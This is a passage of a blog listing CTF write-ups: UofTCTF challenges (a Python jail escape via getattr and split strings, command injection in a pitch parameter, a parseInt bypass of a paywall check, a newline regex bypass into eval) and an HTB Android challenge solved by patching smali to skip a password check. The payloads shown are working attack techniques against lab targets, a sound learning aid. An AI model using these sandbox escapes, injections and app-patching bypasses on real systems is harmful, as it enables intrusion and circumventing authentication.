class="string">'OSError'</span>, <span class="string">'OverflowError'</span>, <span class="string">'PendingDeprecationWarning'</span>, <span class="string">'PermissionError'</span>, <span class="string">'ProcessLookupError'</span>, <span class="string">'RecursionError'</span>, <span class="string">'ReferenceError'</span>, <span class="string">'ResourceWarning'</span>, <span class="string">'RuntimeError'</span>, <span class="string">'RuntimeWarning'</span>, <span class="string">'StopAsyncIteration'</span>, <span class="string">'StopIteration'</span>, <span class="string">'SyntaxError'</span>, <span class="string">'SyntaxWarning'</span>, <span class="string">'SystemError'</span>, <span class="string">'SystemExit'</span>, <span class="string">'TabError'</span>, <span class="string">'TimeoutError'</span>, <span class="string">'True'</span>, <span class="string">'TypeError'</span>, <span class="string">'UnboundLocalError'</span>, <span class="string">'UnicodeDecodeError'</span>, <span class="string">'UnicodeEncodeError'</span>, <span class="string">'UnicodeError'</span>, <span class="string">'UnicodeTranslateError'</span>, <span class="string">'UnicodeWarning'</span>, <span class="string">'UserWarning'</span>, <span class="string">'ValueError'</span>, <span class="string">'Warning'</span>, <span class="string">'ZeroDivisionError'</span>, <span class="string">'__build_class__'</span>, <span class="string">'__debug__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__import__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'__spec__'</span>, <span class="string">'abs'</span>, <span class="string">'aiter'</span>, <span class="string">'all'</span>, <span class="string">'anext'</span>, <span class="string">'any'</span>, <span class="string">'ascii'</span>, <span class="string">'bin'</span>, <span class="string">'bool'</span>, <span class="string">'breakpoint'</span>, <span class="string">'bytearray'</span>, <span class="string">'bytes'</span>, <span class="string">'callable'</span>, <span class="string">'chr'</span>, <span class="string">'classmethod'</span>, <span class="string">'compile'</span>, <span class="string">'complex'</span>, <span class="string">'copyright'</span>, <span class="string">'credits'</span>, <span class="string">'delattr'</span>, <span class="string">'dict'</span>, <span class="string">'dir'</span>, <span class="string">'divmod'</span>, <span class="string">'enumerate'</span>, <span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'exit'</span>, <span class="string">'filter'</span>, <span class="string">'float'</span>, <span class="string">'format'</span>, <span class="string">'frozenset'</span>, <span class="string">'getattr'</span>, <span class="string">'globals'</span>, <span class="string">'hasattr'</span>, <span class="string">'hash'</span>, <span class="string">'help'</span>, <span class="string">'hex'</span>, <span class="string">'id'</span>, <span class="string">'input'</span>, <span class="string">'int'</span>, <span class="string">'isinstance'</span>, <span class="string">'issubclass'</span>, <span class="string">'iter'</span>, <span class="string">'len'</span>, <span class="string">'license'</span>, <span class="string">'list'</span>, <span class="string">'locals'</span>, <span class="string">'map'</span>, <span class="string">'max'</span>, <span class="string">'memoryview'</span>, <span class="string">'min'</span>, <span class="string">'next'</span>, <span class="string">'object'</span>, <span class="string">'oct'</span>, <span class="string">'open'</span>, <span class="string">'ord'</span>, <span class="string">'pow'</span>, <span class="string">'print'</span>, <span class="string">'property'</span>, <span class="string">'quit'</span>, <span class="string">'range'</span>, <span class="string">'repr'</span>, <span class="string">'reversed'</span>, <span class="string">'round'</span>, <span class="string">'set'</span>, <span class="string">'setattr'</span>, <span class="string">'slice'</span>, <span class="string">'sorted'</span>, <span class="string">'staticmethod'</span>, <span class="string">'str'</span>, <span class="string">'sum'</span>, <span class="string">'super'</span>, <span class="string">'tuple'</span>, <span class="string">'type'</span>, <span class="string">'vars'</span>, <span class="string">'zip'</span>]</span><br></pre></td></tr></tbody></table></figure>

<p>We are still able to use getattr to access the object even though the import is banned. And manipulate the string to avoid the blacklist detections.</p>
<p>The solution below avoids the black list character and dots.</p>
<figure class="highlight lisp"><table><tbody><tr><td class="code"><pre><span class="line">getattr(<span class="name">getattr</span>(<span class="name">globals</span>()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('cat flag.txt')</span><br><span class="line"></span><br><span class="line">Or</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getattr(<span class="name">getattr</span>(<span class="name">globals</span>()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('cat flag')</span><br></pre></td></tr></tbody></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.clementi.top/2023/07/13/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html">https://www.clementi.top/2023/07/13/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/326406.html">https://www.freebuf.com/articles/web/326406.html</a>.</p>
<h1 id="Web-Voice-Changer"><a href="#Web-Voice-Changer" class="headerlink" title="Web - Voice Changer"></a>Web - Voice Changer</h1><blockquote>
<p>I made a cool app that changes your voice.</p>
</blockquote>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115165059839.png" class="lazyload"></p>
<p>It’s a web application to record voice and sent over to server side and will parse by ffmpeg.</p>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115165150001.png" class="lazyload"></p>
<p>During the analyse phase using burp, the pitch parameter found to be vulnerable to command injections and the result is return back in the output.</p>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115165259115.png" class="lazyload"></p>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115165323689.png" class="lazyload"></p>
<h1 id="Web-The-Varsity"><a href="#Web-The-Varsity" class="headerlink" title="Web - The Varsity"></a>Web - The Varsity</h1><blockquote>
<p>Come read our newspaper! Be sure to subscribe if you want access to the entire catalogue, including the latest issue.</p>
</blockquote>
<p>Source code is provided, basically after user register, it allows user to view articles.</p>
<p>According to the source code, the flag is stored at article 10</p>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115172824978.png" class="lazyload"></p>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115172922240.png" class="lazyload"></p>
<p>However viewing the article 10 requires subscription which the roles is embedded in JWT.</p>
<p>In this part of code, it provides the POST route for <code>/article</code>.</p>
<figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">"/article"</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">  <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (token) {</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">      <span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> issue = req.<span class="property">body</span>.<span class="property">issue</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">issue</span> &lt; <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>({ <span class="attr">message</span>: <span class="string">"Invalid issue number"</span> });</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (decoded.<span class="property">subscription</span> !== <span class="string">"premium"</span> &amp;&amp; issue &gt;= <span class="number">9</span>) {</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">          .<span class="title function_">status</span>(<span class="number">403</span>)</span><br><span class="line">          .<span class="title function_">json</span>({ <span class="attr">message</span>: <span class="string">"Please subscribe to access this issue"</span> });</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      issue = <span class="built_in">parseInt</span>(issue);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="built_in">isNaN</span>(issue) || issue &gt; articles.<span class="property">length</span> - <span class="number">1</span>) {</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>({ <span class="attr">message</span>: <span class="string">"Invalid issue number"</span> });</span><br><span class="line">      }</span><br><span class="line">	  <span class="keyword">return</span> res.<span class="title function_">json</span>(articles[issue]);</span><br><span class="line">      ..................</span><br></pre></td></tr></tbody></table></figure>

<p>It seems that there’s some problem with the parseInt.</p>
<p>Before parseInt, issue have to be less than 9 and after the parseInt we need issue to be less than 10.</p>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115173721478.png" class="lazyload"></p>
<p>After some research we found that using the scientific notation able us to meet the condition.</p>
<p>when the value of issue is </p>
<p>we will craft the issue to be <code>"9.999e-1"</code> which will bypass the first check and after parseint the value of issues will be 9. </p>
<p>Since the value issue now is 9, it will also bypass the second check, and return <code>res.json(article[9])</code></p>
<p><img src="/images/placeholder.png" data-src="/images/CTF%20-%20uoftctf/image-20240115183741018.png" class="lazyload"></p>
<h1 id="Web-No-Code"><a href="#Web-No-Code" class="headerlink" title="Web - No Code"></a>Web - No Code</h1><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/execute'</span>, methods=[<span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_code</span>():</span><br><span class="line">    code = request.form.get(<span class="string">'code'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">".*[\x20-\x7E]+.*"</span>, code):</span><br><span class="line">        <span class="keyword">return</span> jsonify({<span class="string">"output"</span>: <span class="string">"jk lmao no code"</span>}), <span class="number">403</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        result = <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify({<span class="string">"output"</span>: result}), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, port=<span class="number">1337</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>


<p><code>re.match(".*[\x20-\x7E]+.*", code)</code></p>
<p>This regex is using the <code>re.match()</code> function to check if the <code>code</code> string contains any printable ASCII characters. Let’s break down the components:</p>
<ul>
<li><code>.*</code>: Matches any character (except for a newline) zero or more times.</li>
<li><code>[\x20-\x7E]+</code>: This is a character class that matches one or more characters within the hexadecimal range <code>\x20</code> (space) to <code>\x7E</code> (tilde). This range represents the printable ASCII characters, including letters, digits, punctuation, and some special characters.</li>
</ul>
<p>By enter a new line will bypass the check of regex</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\n__builtins__.__import__('os').popen('cat flag.txt').read()"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://uoftctf-no-code.chals.io/execute"</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url,data={<span class="string">"code"</span>:payload})</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></tbody></table></figure>

<p><code>{"output":"uoftctf{r3g3x_3p1c_f41L_XDDD}"}</code></p>

		  	  
	</div>



	<div class="article-categories">
	 
	</div>
	

	<div class="article-tags">
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2007/12/31/CTF%20-%20uoftctf/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/1998/01/02/HTB-Mobile-Challenge/">HTB-Mobile-Challenge</a>  
	       
		 

		<div class="meta">
			<time>Jan 02, 1998</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<h1 id="APKey"><a href="#APKey" class="headerlink" title="APKey"></a>APKey</h1><blockquote>
<p>This app contains some unique keys. Can you get one?</p>
</blockquote>
<p>Firstly, install the app to inspect the activity main page.</p>
<p>However, face difficulties with installing through adb prompt will following errors:</p>
<p>`adb: failed to install backup.apk: Failure [-124: Failed parse during installPackageLI: Targeting R+ (version 30 and above) requires the resources.arsc of installed APKs to be stored uncompressed and aligned on a 4-byte boundary]</p>
<p>After some research, we have to align the packet in bytes of 4 using zipalign. </p>
<figure class="highlight stata"><table><tbody><tr><td class="code"><pre><span class="line">$ zipalign --<span class="keyword">help</span>                   </span><br><span class="line">zipalign: symbol <span class="keyword">lookup</span> <span class="keyword">error</span>: zipalign: undefined symbol: _ZN11zip_archive6WriterD2Ev</span><br></pre></td></tr></tbody></table></figure>

<p>when trying to launch zipalign from kali linux, I have problem with error for the packet. After more research.</p>
<p><a target="_blank" rel="noopener" href="https://debian.pkgs.org/10/debian-main-amd64/zipalign_8.1.0+r23-2_amd64.deb.html">zipalign</a><br>Manage to download the right package from this site.</p>
<p>perform <code>dpkg -i &lt;package.deb&gt;</code></p>
<p>When installing we are missing <code>android-libandroidfw</code> package.</p>
<figure class="highlight vhdl"><table><tbody><tr><td class="code"><pre><span class="line">$ sudo dpkg -i zipalign_8.<span class="number">1.0</span>+r23-<span class="number">2_</span>amd64.deb </span><br><span class="line">Selecting previously unselected <span class="keyword">package</span> zipalign.</span><br><span class="line">(Reading database ... <span class="number">421645</span> files <span class="keyword">and</span> directories currently installed.)</span><br><span class="line">Preparing <span class="keyword">to</span> unpack zipalign_8.<span class="number">1.0</span>+r23-<span class="number">2_</span>amd64.deb ...</span><br><span class="line">Unpacking zipalign (<span class="number">1</span>:<span class="number">8.1</span>.<span class="number">0</span>+r23-<span class="number">2</span>) ...</span><br><span class="line">dpkg: dependency problems prevent <span class="keyword">configuration</span> <span class="keyword">of</span> zipalign:</span><br><span class="line"> zipalign depends <span class="keyword">on</span> android-libandroidfw; however:</span><br><span class="line">  <span class="keyword">Package</span> android-libandroidfw <span class="keyword">is</span> <span class="keyword">not</span> installed.</span><br><span class="line"></span><br><span class="line">dpkg: <span class="literal">error</span> processing <span class="keyword">package</span> zipalign (<span class="comment">--install):</span></span><br><span class="line"> dependency problems - leaving unconfigured</span><br><span class="line">Processing triggers <span class="keyword">for</span> kali-menu (<span class="number">2023.4</span>.<span class="number">6</span>) ...</span><br><span class="line">Processing triggers <span class="keyword">for</span> man-db (<span class="number">2.12</span>.<span class="number">0</span>-<span class="number">1</span>) ...</span><br><span class="line">Errors were encountered <span class="keyword">while</span> processing:</span><br><span class="line"> zipalign</span><br></pre></td></tr></tbody></table></figure>

<p>Performa a install on the package</p>
<figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install android-libandroidfw</span><br></pre></td></tr></tbody></table></figure>

<p>And now we got our <code>zipalign working</code></p>
<p><code>$ zipalign -p 4 APKey.apk zipalign_APKEY.apk</code></p>
<p>Next we can perform a check if the APK is aligned with 4 bytes</p>
<p><img src="/images/placeholder.png" data-src="/images/HTB-Mobile-Challenge/image-20240203013126191.png" class="lazyload"></p>
<p>Good!</p>
<p>After realign the APK, we have to sign the application again using <code>apksigner</code> with the fake private key</p>
<figure class="highlight applescript"><table><tbody><tr><td class="code"><pre><span class="line">keytool -genkeypair -v -keystore <span class="keyword">my</span>-release-key.jks -keyalg RSA - keysize <span class="number">2048</span> -validity <span class="number">10000</span> -<span class="built_in">alias</span> <span class="keyword">my</span>-<span class="built_in">alias</span></span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight maxima"><table><tbody><tr><td class="code"><pre><span class="line">apksigner <span class="built_in">sign</span> --ks my-release-<span class="built_in">key</span>.jks zipalign_APKEY.apk</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" data-src="/images/HTB-Mobile-Challenge/image-20240203013604159.png" class="lazyload"></p>
<p>Manage to install the application sucessfully this time round.</p>
<p>The application requires a authentication for a key.</p>
<p><img src="/images/placeholder.png" data-src="/images/HTB-Mobile-Challenge/image-20240203013622634.png" class="lazyload"></p>
<h1 id="Decompile-APK"><a href="#Decompile-APK" class="headerlink" title="Decompile APK"></a>Decompile APK</h1><p>Decompile the application with apktool</p>
<p><code>apktool d apkey.apk</code></p>
<p>Also open it using jadx-gui</p>
<p>Inspecting at the manifest file, found the launcher is at <code>MainActivity</code></p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span> <span class="attr">android:versionCode</span>=<span class="string">"1"</span> <span class="attr">android:versionName</span>=<span class="string">"1.0"</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">"30"</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">"11"</span> <span class="attr">package</span>=<span class="string">"com.example.apkey"</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">"30"</span> <span class="attr">platformBuildVersionName</span>=<span class="string">"11"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">"16"</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">"30"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">"@style/Theme.APKey"</span> <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher"</span> <span class="attr">android:allowBackup</span>=<span class="string">"true"</span> <span class="attr">android:supportsRtl</span>=<span class="string">"true"</span> <span class="attr">android:roundIcon</span>=<span class="string">"@mipmap/ic_launcher_round"</span> <span class="attr">android:appComponentFactory</span>=<span class="string">"androidx.core.app.CoreComponentFactory"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">"com.example.apkey.MainActivity"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" data-src="/images/HTB-Mobile-Challenge/image-20240203010556672.png" class="lazyload"></p>
<p>As from the previous section, we notice that the login page requires 2 input box, username and password. It is declare at line 22 and 23 with object <code>EditText</code></p>
<p>This is further prove by <code>if (MainActivity.this.f928c.getText().toString().equals("admin")) {</code><br>which it is checking if the user input for <code>f928c</code> is equal to admin. Next it create a MD5 object and hash the user provided password and check if it is equal to <code>a2a3d412e92d896134d9c9126d756f</code>.</p>
<p>However this hash is uncrackable.</p>
<p>Since it is a simple logic of <strong>EQUAL</strong> , we can modify the smali code to become <strong>NOT EQUAL</strong>.</p>
<p>but first, we have to allocate where is the comparison in smali.</p>
<p>From the apktool decompile folder, navigate to <code>smali/com/example/MainActivity$a.smali</code></p>
<p>About line 141, we saw the hash <code>a2a3d412e92d896134d9c9126d756f</code></p>
<figure class="highlight smali"><table><tbody><tr><td class="code"><pre><span class="line">:try_start_2</span><br><span class="line">  <span class="built_in"> invoke-virtual </span>{p1}, <span class="class">Ljava/security/NoSuchAlgorithmException;</span>-&gt;printStackTrace()V</span><br><span class="line"></span><br><span class="line">  <span class="built_in"> const-string </span>p1, <span class="string">""</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword"> :goto_1</span></span><br><span class="line">  <span class="built_in"> const-string </span>v1, <span class="string">"a2a3d412e92d896134d9c9126d756f"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">   .line</span> 2</span><br><span class="line">  <span class="built_in"> invoke-virtual </span>{p1, v1}, <span class="class">Ljava/lang/String;</span>-&gt;equals(<span class="class">Ljava/lang/Object;</span>)Z</span><br><span class="line"></span><br><span class="line">  <span class="built_in"> move-result </span>p1</span><br><span class="line"></span><br><span class="line">  <span class="built_in"> if-eqz </span>p1,<span class="keyword"> :cond_1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in"> iget-object </span>p1, p0, <span class="class">Lcom/example/apkey/MainActivity$a;</span>-&gt;b:<span class="class">Lcom/example/apkey/MainActivity;</span></span><br></pre></td></tr></tbody></table></figure>

<p>A sample of code near the hash, we can see that the second line</p>
<p><code>invoke-virtual {p1}, Ljava/security/NoSuchAlgorithmException;-&gt;printStackTrace()V</code><br>is actually the printStackTrace function </p>
<p><img src="/images/placeholder.png" data-src="/images/HTB-Mobile-Challenge/image-20240203015313471.png" class="lazyload"></p>
<p>corresponding to the red box.</p>
<p><code>const-string p1, ""</code> next it set the p1 register to an empty string.</p>
<p><code>:goto_1</code> seems a JUMP label which if refer to the code, it is the end of catch.</p>
<p><code>const-string v1, "a2a3d412e92d896134d9c9126d756f"</code>. next it set the V1 register.</p>
<p>On a side note, was curious if the register stored the address or the actual value.</p>
<p><img src="/images/placeholder.png" data-src="/images/HTB-Mobile-Challenge/image-20240203015744441.png" class="lazyload"></p>
<p><a target="_blank" rel="noopener" href="http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html">http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html</a></p>
<p>after that it perform equal function with the string and the hash</p>
<p><code>invoke-virtual {p1, v1}, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z</code></p>
<p>This equal function takes in 2 parameter, and return a boolean <code>Z</code></p>
<p><code>move-result p1</code> next it move the boolean result into p1.</p>
<p><code>if-eqz p1, :cond_1</code> check if P1 is true, then it jumps to label <code>cond_1</code></p>
<p>Which this is the critical statement that wanted to change,</p>
<p>with a little bit help from CHATGPT.</p>
<p><img src="/images/placeholder.png" data-src="/images/HTB-Mobile-Challenge/image-20240203020358846.png" class="lazyload"></p>
<p>Good, we have the code now, let’s save the changes.</p>
<p>Compile the samli app using <code>apktool</code></p>
<figure class="highlight lasso"><table><tbody><tr><td class="code"><pre><span class="line">$ $ apktool b APKey                                          </span><br><span class="line">Picked up _JAVA_OPTIONS: <span class="params">-Dawt.useSystemAAFontSettings</span>=<span class="keyword">on</span> <span class="params">-Dswing.aatext</span>=<span class="literal">true</span></span><br><span class="line">I: Using Apktool <span class="number">2.9</span><span class="number">.3</span></span><br><span class="line">I: Checking whether sources has changed<span class="params">...</span></span><br><span class="line">I: Smaling smali folder <span class="keyword">into</span> classes.dex<span class="params">...</span></span><br><span class="line">I: Checking whether resources has changed<span class="params">...</span></span><br><span class="line">I: Building resources<span class="params">...</span></span><br><span class="line">I: Building apk file<span class="params">...</span></span><br><span class="line">I: Copying unknown files/dir<span class="params">...</span></span><br><span class="line">I: Built apk <span class="keyword">into</span>: APKey/dist/APKey.apk</span><br></pre></td></tr></tbody></table></figure>

<p>Zipalign the 4 bytes and sign again</p>
<figure class="highlight stylus"><table><tbody><tr><td class="code"><pre><span class="line">$ zipalign -<span class="selector-tag">p</span> <span class="number">4</span> APKey<span class="selector-class">.apk</span> zipalign_APKEY<span class="selector-class">.apk</span></span><br><span class="line">$ apksigner sign <span class="attr">--ks</span> ~/Desktop/my-release-key<span class="selector-class">.jks</span> zipalign_APKEY<span class="selector-class">.apk</span></span><br><span class="line">$ adb install zipalign_APKEY<span class="selector-class">.apk</span>                                     </span><br><span class="line">Performing Incremental Install</span><br><span class="line">Serving...</span><br></pre></td></tr></tbody></table></figure>

<p>Type random password, will result in not equal the hash and it actually print the flag.</p>
<p><img src="/images/placeholder.png" data-src="/images/HTB-Mobile-Challenge/image-20240203020801565.png" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
	</div>
	

	<div class="article-tags">
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/1998/01/02/HTB-Mobile-Challenge/">Continue</a> 	
	</div>	
    
</article>

	
	

	
	
 
   <nav class="paginator">
    
        <a class="prev" href="/page/3/"> 
            <i class="iconfont icon-left"></i>
            Prev
        </a>
    

   <span class="page-number"> Page <strong>4</strong>, Posts <strong>33</strong>. </span>

    
        <a class="next" href="/page/5/"> 
            Next
            <i class="iconfont icon-right"></i>
        </a>
    
  </nav> 

	

    <script type="text/x-mathjax-config">
        var post = document.getElementsByClassName("post")[0];  
        MathJax.Hub.Config({
            showProcessingMessages: false,
            messageStyle: "none",    
            tex2jax: {
                inlineMath:  [ ["$", "$"] , ["\\(","\\)"]],
                displayMath: [ ["$$","$$"] , ["\\[","\\]"]],
                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code','a'],
            },
            "HTML-CSS": {            
                showMathMenu: false
            }
        });
        MathJax.Hub.Queue(["Typeset",MathJax.Hub,post]);
    </script>
    <style>.MathJax{outline:0;}</style>

    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.2/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
 
</div>
          </div> 
      </div>            
    
        <i id="toTop" class="iconfont icon-backtotop"></i>

  
    <div class="none" id="search">
    <div class="header">
        <input type="text" placeholder="Typing Something here." id="search-input" class="input">
        
        <i id="search-cancel" class="iconfont icon-cancel"></i>
    </div>

    <div id="search-result" class="result"></div>
</div>
     <div class="mobile-menu">      

      
      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/avatar.jpg">  
      

         
            

            <a class="mobile-menu-link" href="/">Home
            </a>
            
         
            

            <a class="mobile-menu-link" href="/archives">Archives
            </a>
            
         
            

            <a class="mobile-menu-link" href="/tags">Tags
            </a>
            
         
            

            <a class="mobile-menu-link" href="/about">About
            </a>
            
         
                          

            <a class="mobile-menu-link mobile-menu-search" href="#">Search </a>                 
            
         
      
</div>
        
    



     
    


<footer class="footer">
	<div class="inner">
		<div class="copyright">
			©
			
			2020 -
			
			2024
			Ikonw

			<br>
			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
		</div>
	</div>
</footer>   

    
<script src="/nayo.bundle.js"></script>
           
          
</body></html>